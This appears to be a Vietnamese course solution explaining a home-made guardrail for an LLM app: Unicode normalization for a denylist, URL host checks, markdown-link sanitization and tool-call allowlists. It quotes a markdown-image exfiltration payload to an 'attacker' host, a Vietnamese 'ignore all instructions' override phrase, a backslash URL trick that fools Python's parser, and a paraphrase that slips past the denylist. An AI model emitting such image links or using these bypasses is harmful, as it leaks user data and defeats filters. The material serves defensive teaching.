# Lời giải: guardrail tự viết cho input và output

## Cách làm

**`normalize`** là nơi dồn mọi phép biến đổi "cùng nghĩa với người đọc, khác byte với máy": NFKC gộp chữ toàn khổ và
ký tự tương thích; bỏ nhóm `Cf` (zero-width space `U+200B`, zero-width joiner `U+200D`, word joiner `U+2060`, ký tự
đảo chiều `U+202E`); `casefold` mạnh hơn `lower`; bảng `CONFUSABLES` đưa Cyrillic và Greek trông giống Latin về Latin;
bỏ dấu tiếng Việt bằng NFD rồi lọc `Mn` (riêng `đ` không tách dấu được nên đổi tay); cuối cùng mọi ký tự khác `a-z0-9`
thành dấu cách.

**`find_denied`** dựng regex từ cụm đã chuẩn hoá, bỏ dấu cách:
`(?<![a-z0-9])` + `" ?".join(ký tự)` + `(?![a-z0-9])`. Vì văn bản đã chuẩn hoá chỉ còn một dấu cách giữa các token,
`" ?"` đủ để khớp cả chữ cách quãng, gạch nối, zero-width (đã thành dấu cách hoặc biến mất) lẫn viết liền.

**`host_allowed`** từ chối ngay URL có `\`, khoảng trắng, ký tự điều khiển hay vô hình, rồi dùng
`urlsplit(url).hostname`: hàm này đã bỏ `user@`, `:cổng` và đổi chữ thường. So sánh "bằng hoặc kết thúc bằng `.` + miền"
để `evilcongty.vn` không lọt.

Vì sao phải từ chối `\`: `urlsplit` của Python theo RFC 3986, còn trình duyệt theo chuẩn WHATWG URL, coi `\` như `/` với
`http`, `https`. Với `https://evil.example\@congty.vn/x`, Python thấy host `congty.vn` (phần trước `@` là userinfo), trình
duyệt thấy host `evil.example` (đường dẫn bắt đầu từ `\`). Guard kiểm bằng một parser, nạn nhân mở bằng parser khác:
đó là lớp lỗi "parser differential". Cách an toàn là từ chối mọi URL mà hai parser có thể hiểu khác nhau, thay vì cố
chuẩn hoá cho giống trình duyệt.

**`sanitize_links`**: ba regex, ba lượt `re.sub` với hàm thay thế. **`check_tool_call`**: tool không có trong `policy`
là lỗi duy nhất cần báo; sau đó kiểm tham số thừa, tham số thiếu, rồi từng luật.

## Vì sao như vậy

- **Chuẩn hoá trước khi so** là bài học chung của mọi bộ lọc chuỗi: so trên chuỗi gốc thì mỗi biến thể Unicode là một
  đường lách. Thứ tự quan trọng: `casefold` trước bảng confusable (bảng chỉ cần chữ thường), NFKC trước tất cả.
- **Bỏ dấu tiếng Việt có giá**: "bỏ quà" và "bỏ qua" thành một. Danh sách chặn tiếng Việt vì thế nên gồm cụm dài
  (`bỏ qua mọi hướng dẫn`), không phải từ đơn. Đây cũng là lý do danh sách chặn chỉ là một lớp rẻ, chạy trước
  classifier (bài Intermediate 01) và không bao giờ là lớp duy nhất.
- **Ảnh markdown** là kênh rò rỉ thật đã được báo cáo ở nhiều sản phẩm chat: model bị injection viết
  `![](https://attacker/?d=<dữ liệu>)`, giao diện render ảnh, trình duyệt gửi request kèm dữ liệu. Lọc ở **output** bằng
  allowlist chặn được cả kênh này bất kể injection nằm ở đâu, nên đây là phòng thủ bằng code đáng giá nhất của module
  (bài Intermediate 02 đo nó).
- **Allowlist tool và tham số** biến "model có thể làm gì" từ một câu trong prompt thành một hợp đồng code kiểm được.
  `fullmatch` thay `search` để `a@congty.vn.evil.example` không khớp `[a-z0-9._-]+@congty\.vn`.

## Giới hạn

- Danh sách chặn bắt cụm, không bắt ý: "đừng để ý tới những gì người ta dặn bạn ở trên" qua mặt mọi cụm trong test.
  Bài Intermediate 01 đo một classifier, bài Advanced 01 đo cả hai trên bộ tấn công.
- Bảng confusable ở đây chỉ vài chục ký tự; bảng đầy đủ của Unicode (UTS #39) có hàng nghìn.
- `sanitize_links` không xử lý HTML (`<img src=...>`) hay URL bị mã hoá (`hxxp`, base64): output chỉ nên render dạng
  markdown đã lọc, không render HTML thô.

## Bẫy thường gặp

- So `lower()` trên chuỗi gốc, quên NFKC: chữ toàn khổ lọt.
- Lấy host bằng cách cắt chuỗi giữa `//` và `/`: `https://congty.vn@evil.example/` bị coi là `congty.vn`.
- Kiểm `host.endswith("congty.vn")` không có dấu chấm: `evilcongty.vn` lọt.
- Đặt `\b` trước mẫu URL trần: URL dính liền sau một chữ (`ảnhˆhttps://...`, với `ˆ` là ký tự chữ theo Unicode) lọt qua.
- Tin `urlsplit` cho mọi URL: `https://evil.example\@congty.vn/` qua được kiểm tra nhưng trình duyệt mở `evil.example`.
- Ảnh tới host lạ chỉ bỏ URL nhưng giữ `![...]`, hoặc giữ cả cụm vì "chỉ là ảnh".
- `isinstance(True, int)` là `True`: `amount: true` lọt qua kiểm `max`.
